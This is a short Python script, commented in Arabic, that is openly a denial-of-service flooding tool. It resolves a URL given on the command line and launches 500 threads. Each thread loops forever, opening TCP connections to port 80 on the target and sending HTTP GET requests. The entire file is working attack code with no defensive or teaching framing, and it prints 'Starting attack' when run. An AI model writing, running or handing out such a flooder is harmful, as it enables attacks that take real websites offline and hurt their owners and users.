import sys
import socket
import threading

# إعدادات الهجوم
target_ip = "" # سيتم استبداله بالرابط
port = 80      # المنفذ الافتراضي للمواقع

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
            s.close()
        except:
            pass

def start_ddos():
    global target_ip
    # استقبال الرابط من الواجهة
    url = sys.argv[1].replace("https://", "").replace("http://", "").split('/')[0]
    try:
        target_ip = socket.gethostbyname(url)
    except:
        print("[-] Could not resolve host")
        return

    print(f"[*] Starting attack on {target_ip}")
    
    # تشغيل 500 "خيط" (Thread) للهجوم المتوازي
    for i in range(500):
        thread = threading.Thread(target=attack)
        thread.start()

if __name__ == "__main__":
    start_ddos()

